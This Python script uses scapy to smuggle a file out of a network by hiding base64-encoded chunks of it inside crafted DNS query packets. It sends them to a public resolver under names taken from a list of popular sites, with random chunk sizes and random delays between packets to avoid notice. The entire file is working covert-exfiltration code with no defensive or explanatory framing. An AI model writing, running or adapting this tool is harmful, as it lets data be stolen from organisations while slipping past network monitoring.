import os
import base64 as b64
import random
import time
from scapy.all import *


def make_me_a_dns(name, secret_data):
  labels = [(chr(len(label)), label) for label in name.split('.')]
  trans_id = os.urandom(2)
  flags = '\x01\x20'
  questions = '\x00\x01'
  answers = '\x00\x00'
  authority = '\x00\x00'
  additional = '\x00\x00'
  first_fwd_ptr = '\xc0' + '\x12'
  qtype = '\x00\x01'   # A record
  qclass = '\x00\x01'  # IN class

  head_ll_ls = ''.join(labels[0])
  tail_ll_ls = ''.join([ll+ls for (ll, ls) in labels[1:]])

  dns = trans_id + flags + questions + answers + authority + additional + first_fwd_ptr + qtype + qclass + head_ll_ls
  second_fwd_ptr = '\xc0' + chr(len(dns) + 2 + len(secret_data))
  dns = dns + second_fwd_ptr + secret_data + tail_ll_ls
  dns = Raw(dns)
  pkt = IP(dst='8.8.8.8') / UDP(dport=53) / dns
  return pkt


def chunker(data, size=random.randint(10, 55)):
  for i in range(0, len(data)-1, size):
    yield data[i:i+size]  


# read in data to send
filename_to_exfil = 'foo.pdf'
with open(filename_to_exfil, 'r') as f:
  data = f.read() 

# while we have data chunks, read a name to query, encode the data chunk, send query
name = ''
with open('topsites.txt', 'r') as f:
  for data_chunk in chunker(data):
    while name.count('.') < 2:
      name = f.readline().strip()
      if not name.endswith('.'):
        name = name + '.'

    pkt = make_me_a_dns(name, b64.b64encode(data_chunk))
    send(pkt)
    time.sleep( random.choice([2, 5, 13]) )
    name = ''
